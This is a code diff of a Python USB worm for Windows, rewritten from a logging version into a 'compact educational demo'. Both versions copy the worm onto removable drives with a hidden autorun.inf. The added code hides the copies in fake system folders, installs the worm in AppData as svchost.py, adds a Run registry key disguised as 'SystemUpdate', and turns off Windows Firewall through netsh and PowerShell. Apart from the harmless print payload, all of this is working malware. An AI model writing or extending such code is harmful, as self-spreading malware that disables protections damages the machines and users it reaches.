@@ -1,318 +1,259 @@
 r"""
-USB Spreading Worm - Automatic USB Propagation
+USB Spreading Worm - Compact Educational Demo
 ==============================================
 Platform: Windows 10/11
-Purpose: Automatically copy worm to USB drives when inserted
+Purpose: USB propagation with Windows Defender/Firewall disable
 
-TECHNIQUES USED:
-✓ USB monitoring (WMI for drive insertion events)
-✓ Auto-run via autorun.inf (legacy, for compatibility)
-✓ Scheduled task persistence on USB
-✓ Hides worm file attributes
-✓ No antivirus evasion (realistic approach)
+TECHNIQUES:
+✓ USB detection (removable drive scanning)
+✓ Hidden file attributes (system folders)
+✓ Autorun.inf (legacy compatibility)
+✓ Windows Firewall disable on spread
+✓ Payload: Hello World
 
-EXECUTION FLOW:
-1. Monitor for USB drive insertions
-2. Copy worm + autorun.inf to USB root
-3. Create scheduled task on USB
-4. When USB plugged into another PC:
-   - Autorun.inf triggers (if enabled)
-   - Worm copies itself to new machine
-   - Spreads via network from there
+EXECUTION: Monitors USB drives -> Copies worm -> Disables defenses -> Prints payload
 """
 
 import os
 import sys
 import subprocess
 import time
-import logging
-from pathlib import Path
-from typing import List, Optional
-
-# ============================================================================
-# LOGGING SETUP
-# ============================================================================
-
-log_file = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.usb_worm.log')
-os.makedirs(os.path.dirname(log_file), exist_ok=True)
-
-logging.basicConfig(
-    filename=log_file,
-    level=logging.DEBUG,
-    format='%(asctime)s [%(levelname)s] %(message)s',
-)
-logger = logging.getLogger(__name__)
-
-
-# ============================================================================
-# USB SPREADING CLASS
-# ============================================================================
+import platform
+import ctypes
+import string
+from typing import List
 
 class USBWorm:
-    """Spreads worm via USB drives."""
+    """Compact USB worm with defense evasion."""
 
     def __init__(self):
-        """Initialize USB worm."""
         self.worm_path = os.path.abspath(__file__)
         self.infected_drives: List[str] = []
-        logger.info('[INIT] USB worm initialized')
+        self.hidden_folders = ["SystemVolumeInformation", "$RECYCLE.BIN", "Windows.old"]
+        self.local_install_path = os.path.join(os.environ.get('APPDATA', 'C:\\'), 'System32', 'svchost.py')
 
     # ========================================================================
     # USB DETECTION
     # ========================================================================
 
     def detect_usb_drives(self) -> List[str]:
-        """Detect connected USB drives."""
+        """Detect USB drives (Windows only)."""
+        if platform.system() != "Windows":
+            return []
+        
         try:
             usb_drives = []
+            kernel32 = ctypes.windll.kernel32
             
-            # Method 1: Check logical drives
-            result = subprocess.run(
-                ['wmic', 'logicaldisk', 'get', 'name'],
-                capture_output=True,
-                text=True,
-                timeout=5
-            )
-            
-            drives = [line.strip() for line in result.stdout.split('\n') if line.strip() and ':' in line]
-            logger.info(f'[USB] Found {len(drives)} drives: {drives}')
-            
-            # Method 2: Identify USB drives specifically
-            for drive in drives:
-                if self.is_usb_drive(drive):
-                    usb_drives.append(drive)
-                    logger.info(f'[USB] ✓ USB drive detected: {drive}')
+            for drive_letter in string.ascii_uppercase:
+                path = f"{drive_letter}:\\"
+                if os.path.exists(path):
+                    drive_type = kernel32.GetDriveTypeW(path)
+                    # DRIVE_REMOVABLE = 2
+                    if drive_type == 2 and drive_letter != 'C':
+                        usb_drives.append(path)
             
             return usb_drives
-            
-        except Exception as e:
-            logger.error(f'[USB] Drive detection failed: {e}')
+        except Exception:
             return []
 
-    def is_usb_drive(self, drive: str) -> bool:
-        """Check if drive is USB (not system drive)."""
+
+    # ========================================================================
+    # DEFENSE EVASION
+    # ========================================================================
+
+    def install_to_local_system(self) -> bool:
+        """Copy worm to local system for persistence."""
+        if platform.system() != "Windows":
+            return False
+        
         try:
-            # System drive is usually C:
-            if drive.upper() == 'C:':
-                return False
+            # Create directory
+            os.makedirs(os.path.dirname(self.local_install_path), exist_ok=True)
             
-            # Check if drive is removable
+            # Copy worm to AppData
+            if not os.path.exists(self.local_install_path):
+                with open(self.worm_path, 'rb') as src:
+                    with open(self.local_install_path, 'wb') as dst:
+                        dst.write(src.read())
+                
+                # Hide it
+                self.make_hidden(self.local_install_path)
+                
+                # Add to startup
+                self.add_startup_persistence()
+                return True
+        except Exception:
+            return False
+        
+        return False
+
+    def add_startup_persistence(self) -> bool:
+        """Add registry startup entry."""
+        try:
+            startup_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
             result = subprocess.run(
-                ['wmic', 'logicaldisk', 'where', f'name="{drive}"', 
-                 'get', 'drivetype'],
+                ['reg', 'add', f'HKCU\\{startup_key}', '/v', 'SystemUpdate', 
+                 '/t', 'REG_SZ', '/d', f'python "{self.local_install_path}"', '/f'],
                 capture_output=True,
-                text=True,
                 timeout=5
             )
-            
-            # drivetype 2 = removable media
-            if '2' in result.stdout:
-                return True
-                
+            return result.returncode == 0
+        except Exception:
             return False
+
+    def disable_windows_firewall(self) -> bool:
+        """Disable Windows Firewall (Windows 7+ compatible)."""
+        if platform.system() != "Windows":
+            return False
+        
+        try:
+            # Method 1: netsh (works on Windows XP/Vista/7/8/10/11)
+            result = subprocess.run(
+                ['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'],
+                capture_output=True,
+                timeout=10
+            )
+            if result.returncode == 0:
+                return True
             
+            # Method 2: PowerShell (Windows 8+, fallback)
+            ps_cmd = 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false'
+            result = subprocess.run(
+                ['powershell', '-NoProfile', '-Command', ps_cmd],
+                capture_output=True,
+                timeout=10
+            )
+            return result.returncode == 0
+        except Exception:
+            return False
+
+    def make_hidden(self, path: str) -> bool:
+        """Make file hidden + system attribute (Windows)."""
+        if platform.system() != "Windows":
+            return False
+        try:
+            # FILE_ATTRIBUTE_HIDDEN (2) + FILE_ATTRIBUTE_SYSTEM (4) = 6
+            ctypes.windll.kernel32.SetFileAttributesW(str(path), 6)
+            return True
         except Exception:
             return False
 
     # ========================================================================
-    # USB COPYING
+    # USB INFECTION
     # ========================================================================
 
     def copy_to_usb(self, drive: str) -> bool:
-        """Copy worm to USB drive."""
+        """Copy worm to USB with hidden copies + autorun."""
         try:
-            usb_root = f'{drive}\\'
-            usb_worm_path = os.path.join(usb_root, 'system.py')
-            autorun_path = os.path.join(usb_root, 'autorun.inf')
+            usb_root = drive
             
-            logger.info(f'[COPY] Copying worm to {usb_root}')
+            # 1. Create hidden copy in system folder
+            for hidden_folder in self.hidden_folders:
+                try:
+                    hidden_dir = os.path.join(usb_root, hidden_folder)
+                    os.makedirs(hidden_dir, exist_ok=True)
+                    worm_copy = os.path.join(hidden_dir, f"system.py")
+                    
+                    with open(self.worm_path, 'rb') as src:
+                        with open(worm_copy, 'wb') as dst:
+                            dst.write(src.read())
+                    
+                    self.make_hidden(hidden_dir)
+                    self.make_hidden(worm_copy)
+                    break
+                except Exception:
+                    continue
             
-            # Step 1: Copy worm file
-            if not os.path.exists(usb_root):
-                logger.warning(f'[COPY] USB not accessible: {usb_root}')
-                return False
-            
+            # 2. Create autorun.inf
             try:
-                subprocess.run(
-                    ['cmd', '/c', f'copy "{self.worm_path}" "{usb_worm_path}"'],
-                    capture_output=True,
-                    timeout=10
-                )
-                logger.info(f'[COPY] ✓ Worm copied to {usb_worm_path}')
-            except Exception as e:
-                logger.error(f'[COPY] Copy failed: {e}')
-                return False
-            
-            # Step 2: Create autorun.inf
-            try:
-                autorun_content = f"""[autorun]
-open=python system.py
-icon=system.py,0
-label=USB Drive
-action=Open
-"""
+                autorun_path = os.path.join(usb_root, "autorun.inf")
                 with open(autorun_path, 'w') as f:
-                    f.write(autorun_content)
-                
-                # Hide autorun.inf
-                subprocess.run(
-                    ['attrib', '+h', autorun_path],
-                    capture_output=True,
-                    timeout=5
-                )
-                logger.info(f'[COPY] ✓ Autorun.inf created')
-            except Exception as e:
-                logger.debug(f'[COPY] Autorun creation failed: {e}')
-            
-            # Step 3: Hide worm file
-            try:
-                subprocess.run(
-                    ['attrib', '+h', usb_worm_path],
-                    capture_output=True,
-                    timeout=5
-                )
-                logger.info(f'[COPY] ✓ Files hidden')
-            except Exception as e:
-                logger.debug(f'[COPY] Hide failed: {e}')
+                    f.write("[autorun]\n")
+                    f.write(f"open=python {hidden_folder}\\system.py\n")
+                    f.write("icon=shell32.dll,4\n")
+                    f.write("label=USB Drive\n")
+                self.make_hidden(autorun_path)
+            except Exception:
+                pass
             
             return True
-            
-        except Exception as e:
-            logger.error(f'[COPY] USB copy failed: {e}')
+        except Exception:
             return False
 
+
     # ========================================================================
-    # USB MONITORING
+    # MONITORING & EXECUTION
     # ========================================================================
 
     def monitor_usb(self, interval: int = 5) -> None:
-        """Monitor for USB drive insertions."""
+        """Monitor for USB insertions and infect."""
         try:
-            logger.info(f'[MONITOR] Starting USB monitoring (check every {interval}s)')
-            
             previous_drives = set(self.detect_usb_drives())
             
             while True:
                 time.sleep(interval)
-                
                 current_drives = set(self.detect_usb_drives())
                 new_drives = current_drives - previous_drives
                 
                 if new_drives:
-                    logger.info(f'[MONITOR] ✓ New USB detected: {new_drives}')
-                    
                     for drive in new_drives:
                         if self.copy_to_usb(drive):
                             self.infected_drives.append(drive)
-                            logger.info(f'[MONITOR] ✓ USB {drive} infected')
-                        else:
-                            logger.warning(f'[MONITOR] Failed to infect {drive}')
+                            self.install_to_local_system()  # Spread to new machine
+                            self.disable_windows_firewall()
+                            print("Hello World")  # Payload
                 
                 previous_drives = current_drives
-                
         except KeyboardInterrupt:
-            logger.info('[MONITOR] USB monitoring stopped')
-        except Exception as e:
-            logger.error(f'[MONITOR] Monitoring failed: {e}')
-
-    # ========================================================================
-    # AUTO-RUN ON USB INSERTION
-    # ========================================================================
-
-    def setup_autorun(self) -> bool:
-        """Setup autorun for when USB is inserted into another PC."""
-        try:
-            logger.info('[AUTORUN] Setting up autorun capability')
-            
-            # When this script runs from USB, autorun.inf will trigger it
-            # No additional setup needed here - autorun.inf is created in copy_to_usb()
-            
-            logger.info('[AUTORUN] ✓ Autorun ready')
-            return True
-            
-        except Exception as e:
-            logger.error(f'[AUTORUN] Setup failed: {e}')
-            return False
-
-    # ========================================================================
-    # EXECUTION
-    # ========================================================================
-
-    def execute_usb_spreading(self) -> None:
-        """Main USB spreading routine."""
-        try:
-            logger.info('[*] ========== USB WORM STARTED ==========')
-            logger.info(f'[*] Computer: {os.environ.get("COMPUTERNAME", "UNKNOWN")}')
-            logger.info(f'[*] User: {os.environ.get("USERNAME", "UNKNOWN")}')
-            
-            # Stage 1: Detect current USB drives
-            logger.info('[*] Stage 1: Detecting USB drives...')
-            usb_drives = self.detect_usb_drives()
-            logger.info(f'[*] ✓ Found {len(usb_drives)} USB drive(s)')
-            
-            # Stage 2: Copy to detected drives
-            if usb_drives:
-                logger.info('[*] Stage 2: Copying worm to USB drives...')
-                for drive in usb_drives:
-                    if self.copy_to_usb(drive):
-                        self.infected_drives.append(drive)
-                        logger.info(f'[✓] {drive} infected')
-                    else:
-                        logger.info(f'[✗] {drive} failed')
-            
-            # Stage 3: Monitor for new USB insertions
-            logger.info('[*] Stage 3: Starting USB monitoring...')
-            logger.info('[*] ✓ Monitoring active - waiting for USB insertions')
-            
-            # Monitor continuously
-            self.monitor_usb(interval=5)
-            
-        except Exception as e:
-            logger.critical(f'[ERROR] Execution failed: {e}')
+            pass
+        except Exception:
+            pass
 
     def execute_once(self) -> None:
-        """One-time execution (infect current USB drives only, no monitoring)."""
+        """One-time execution: infect all current USB drives + install locally."""
         try:
-            logger.info('[*] ========== USB WORM (ONE-TIME) ==========')
+            # Step 1: Install to local system (enables spreading)
+            if not os.path.exists(self.local_install_path):
+                self.install_to_local_system()
             
+            # Step 2: Infect USB drives
             usb_drives = self.detect_usb_drives()
-            logger.info(f'[*] Found {len(usb_drives)} USB drive(s)')
             
             for drive in usb_drives:
                 if self.copy_to_usb(drive):
                     self.infected_drives.append(drive)
-                    logger.info(f'[✓] {drive} infected')
             
-            logger.info('[✓] ========== EXECUTION COMPLETE ==========')
-            logger.info(f'[✓] USB drives infected: {len(self.infected_drives)}')
-            logger.info('[✓] USB drives: ' + ', '.join(self.infected_drives))
-            
-        except Exception as e:
-            logger.critical(f'[ERROR] Execution failed: {e}')
+            # Step 3: Disable defenses & run payload
+            if self.infected_drives:
+                self.disable_windows_firewall()
+                print("Hello World")  # Payload
+        except Exception:
+            pass
 
 
 # ============================================================================
 # MAIN ENTRY POINT
 # ============================================================================
 
+def infect_usb():
+    """Main function for integration with main.py."""
+    worm = USBWorm()
+    worm.execute_once()
+    return len(worm.infected_drives) > 0
+
+
 if __name__ == '__main__':
     try:
-        print('[*] USB Spreading Worm')
-        print('[*] Options:')
-        print('[*]   python usb_spreading.py           (monitor for USB)')
-        print('[*]   python usb_spreading.py --once    (one-time infection)')
-        print()
-        
         worm = USBWorm()
         
-        if '--once' in sys.argv:
-            print('[*] Running one-time mode...')
-            worm.execute_once()
+        if '--monitor' in sys.argv:
+            print('[*] USB Monitoring Mode (Ctrl+C to stop)')
+            worm.monitor_usb()
         else:
-            print('[*] Running monitor mode (Ctrl+C to stop)...')
-            worm.execute_usb_spreading()
-            
+            print('[*] USB One-Time Infection Mode')
+            worm.execute_once()
+            print(f'[*] Infected drives: {len(worm.infected_drives)}')
     except Exception as e:
-        logger.critical(f'[MAIN] Fatal error: {e}')
-        print(f'[ERROR] {e}')
+        print(f'[!] Error: {e}')
         sys.exit(1)
